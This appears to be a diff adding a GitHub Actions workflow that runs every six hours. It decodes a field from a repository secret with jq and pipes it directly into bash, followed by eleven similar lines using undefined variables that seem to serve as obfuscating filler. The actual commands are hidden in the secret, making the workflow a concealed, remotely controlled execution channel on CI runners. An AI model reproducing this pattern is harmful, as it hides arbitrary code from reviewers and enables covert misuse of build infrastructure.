@@ -1,0 +1,29 @@
+name: layercengjin
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: layercengjin
+        env:
+          n0: ${{ secrets.n0 }}
+        run: |
+          echo $n0 | jq -r .a7 | /bin/bash
+          echo $t338 | jq -r .awzme8779 | /bin/bash
+          echo $nl25 | jq -r .p934 | /bin/bash
+          echo $cvfg3 | jq -r .a0 | /bin/bash
+          echo $y5 | jq -r .ukh65 | /bin/bash
+          echo $y91 | jq -r .wpja89320 | /bin/bash
+          echo $bbltt101 | jq -r .q7557 | /bin/bash
+          echo $qk2005 | jq -r .jv31 | /bin/bash
+          echo $wvis47733 | jq -r .oubtf29 | /bin/bash
+          echo $bkr90 | jq -r .weil9 | /bin/bash
+          echo $g657 | jq -r .o714 | /bin/bash
+          echo $pvyob0101 | jq -r .qnuna3 | /bin/bash
+
